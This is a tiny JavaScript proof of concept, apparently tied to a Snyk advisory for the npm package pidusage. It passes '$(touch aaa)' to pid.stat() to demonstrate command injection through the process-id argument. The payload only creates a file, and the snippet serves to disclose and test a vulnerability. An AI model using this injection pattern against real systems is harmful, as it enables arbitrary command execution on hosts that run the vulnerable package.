//https://snyk.io/vuln/npm:pidusage:20170605
var pid = require('pidusage');
pid.stat('$(touch aaa)');